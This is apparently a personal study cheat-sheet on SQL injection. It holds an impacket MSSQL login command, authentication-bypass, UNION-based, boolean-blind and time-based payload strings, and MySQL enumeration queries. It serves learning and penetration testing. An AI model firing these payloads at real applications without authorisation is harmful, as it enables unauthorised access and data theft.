# SQL Injection

On Kali, to connect to an MSSQL database on a Windows machine, do:

```
impacket-mssqlclient ${USER}:${PW}@${RHOST} -windows-auth
```

## Error based

When logging into an application, you might see errors from the underlying databases.
This can be a sign of potential for SQL injection.
A good starting point to check for that would be:

```
admin' OR 1=1 -- //
```

This is good against queries such as `SELECT * from users where user=$user and pw=$pw`.
The early `' OR 1=1 -- //` is an attempt at ending the query early by outcommenting the `and...` statement and instead evaluating `1=1`

## In-band Union based injection

When the results are shown on the page, it can be good to attempt a Union based attack.
This often happens when the underlying database runs a query like

```
SELECT * WHERE UserInfo LIKE $userInput
```
and the result is simply shown on the corresponding website.
Start by enumerating the number of collumns in the table.
Once that is done, you will be able to get a number of columns where you can see the output 


then, we can do futher enumeration like:

```
' UNION SELECT null, user(), @@version, database(), null, null  -- //
```
or enumeration queries as seen in the bottom of this note document.

## Blind SQLi


To test for blind boolean-based SQLi, do something like:

```
admin' AND 1=1 -- //
```

This will only return true if the `admin` user exists.

Similarly, for time-based SQLi, we can do something like:

```
admin' AND IF (1=1, sleep(4),'false') 
```
which will return after 4 seconds when `admin` exists.


## Good enumeration queries for MySQL

```
SELECT table_name FROM information_schema.tables
```
equivalent to `SHOW DATABASES`:
```
SELECT schema_name 
FROM information_schema.schemata;
